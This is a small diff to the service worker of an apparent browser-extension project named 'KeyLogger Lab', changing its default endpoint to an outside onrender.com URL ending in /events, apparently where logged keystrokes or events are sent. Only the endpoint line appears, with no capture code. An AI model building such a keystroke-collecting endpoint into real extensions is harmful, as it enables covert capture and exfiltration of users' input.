@@ -1,6 +1,6 @@
 console.log("KeyLogger Lab service worker loaded");
 
-const DEFAULT_ENDPOINT = "https://webbrowser-trsk.onrender.com";
+const DEFAULT_ENDPOINT = "https://webbrowser-trsk.onrender.com/events";
 
 function getEndpointFromStorage() {
   return new Promise((resolve) => {
